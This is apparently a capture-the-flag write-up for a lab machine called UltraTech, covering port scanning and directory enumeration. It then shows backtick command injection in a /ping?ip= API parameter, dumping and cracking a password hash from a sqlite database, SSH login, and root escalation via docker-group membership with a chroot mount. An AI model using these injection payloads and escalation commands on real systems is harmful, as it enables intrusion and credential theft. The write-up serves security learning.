### Enum

set $TARGET = 10.10.105.146

> nmap -Pn -A $TARGET
> nmap -Pn -p- -A 10.10.105.146

```

```

we have apache running on 31331 and node.js running on 8081

enum the directories.

```
	+ http://10.10.105.146:8081/auth (CODE:200|SIZE:39)                                                
	+ http://10.10.105.146:8081/ping (CODE:500|SIZE:1094)
```

2 dirs are being used ( Task 2 Q 5)

---

The software using the port 8080 (\*8081) is a REST api, how many of its routes are used by the web application?

Web app : port 31331 , REST api : 8081

so we must check the 31331 source codes to find out refrences for js.

> dirb $TARGET:31331
```
+ http://10.10.105.146:31331/robots.txt (CODE:200|SIZE:53)
```

on robots.txt :
```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

Interesting.
On /utech_sitemap.txt :
```
/
/index.html
/what.html
/partners.html

```

I checked /index.html and /what.html pages. there was nothing useful there

on /partners.html we have a login page.
```html
	<script src='js/app.min.js'></script>
	<script src='js/api.js'></script>
```

---

### Let the Fun begin

we have /parters.html login page which can be exploited.
so let's check it.

manual sql injection test using \' and \"
> URL: http://10.10.105.146:8081/auth?login=%27&password=%22
it's the \' that breaks the system.

```
Invalid credentials
```

Not Blind. let's exploit it with sqlmap.
But it Didn't work.

So let's return to the page source to find out how it works

on /api.js :
```
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();

```

> function getAPIURL() {return `${window.location.hostname}:8081`}

> const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`

> form.action = `http://${getAPIURL()}/auth`;

for the authentication it pings the given ip on /ping?ip=  

lets inject some commands with \` charachter.

> http://10.10.105.146:8081/ping?ip=`id`

```
ping: groups=1002(www): Temporary failure in name resolution 
```

Cool! Now let the fun begin!

> URL : http://10.10.105.146:8081/ping?ip=`ls`

found the database name; utech.db.sqlite

> URL : http://10.10.105.146:8081/ping?ip=`cat utech.db.sqlite`

```
	) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84
```

f357a0c52799563c7c7b76c1e7543a32 is the r00t's hashed password

let's crack it using hashcat ( Hint: *******.txt means the world famous rockyou.txt )

> hashcat -m 0 --force f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt

note: I don't have Intel OpenCL device on my vm. so I use --force mode

```
	f357a0c52799563c7c7b76c1e7543a32:n100906         
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: f357a0c52799563c7c7b76c1e7543a32
.
.
.
```

#### Getting shell

So we have r00t user's credentials : r00t:n100906

let's give it to the /auth on partners.html login page.

after login: 
```
Restricted area

Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1
```

OK! we will take a look!

---

On the Task 4 description :
```
Congrats if you've made it this far, you should be able to comfortably run commands on the server by now!
```

Nope, We are not comfortable with url command injection!
It must say we can ssh to the server with the credentials we have.

> ssh r00t@10.10.105.146

r00t@ultratech-prod:~$

We are logged in! and COMFORTABLE!


#### PrivEsc

> id

```
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Note: There is docker on this machine.


###### Diggin' Deeply

Used LinEnum.sh like alwayes. \> linenumres

Interesting Resaults: 
```
[-] It looks like we have some admin users:
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=1000(lp1) gid=1000(lp1) groups=1000(lp1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)


[-] Accounts that have recently used sudo:
/home/lp1/.sudo_as_admin_successful


[+] Looks like we're hosting Docker:
Docker version 18.09.2, build 6247962
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                       PORTS               NAMES
7beaaeecd784        bash                "docker-entrypoint.s…"   12 months ago       Exited (130) 12 months ago                       unruffled_shockley
696fb9b45ae5        bash                "docker-entrypoint.s…"   12 months ago       Exited (127) 12 months ago                       boring_varahamihira
9811859c4c5c        bash                "docker-entrypoint.s…"   12 months ago       Exited (127) 12 months ago                       boring_volhard


[+] We're a member of the (docker) group - could possibly misuse these rights!
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

```

There is a lot going on, which I could not process to find the PrivEsc vector.
I did work with docker before but I don't have any idea what can we do with mounted isolated environments.

Also we have the admin lp1 who sent us a warning to check conf files.

* checked lp1's home dir, nothing interesting.

* Googled about privesc via docker:
	
	```
	https://fosterelli.co/privilege-escalation-via-docker

		If you happen to have gotten access to a user-account on a machine, and that user is a member of the ‘docker’ group, running the following command will give you a root shell:
			> docker run -v /:/hostOS -i -t chrisfosterelli/rootplease

	------

	https://gtfobins.github.io/gtfobins/docker/

		It can be used to break out from restricted environments by spawning an interactive system shell.
		The resulting is a root shell.
		    > docker run -v /:/mnt --rm -it alpine chroot /mnt sh

	```

So we can break out as root to our host machine!

> docker run -v /:/mnt --rm -it bash chroot /mnt sh

```
	# whoami
	root
```

#### Final flag

now we are root, we just need to cat out the ip_rsa on /root

* Side track:
```
# cat /root/private.txt
	# Life and acomplishments of Alvaro Squalo - Tome I

	Memoirs of the most successful digital nomdad finblocktech entrepreneur
	in the world.

	By himself.

	## Chapter 1 - How I became successful

```

```
# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBA...
```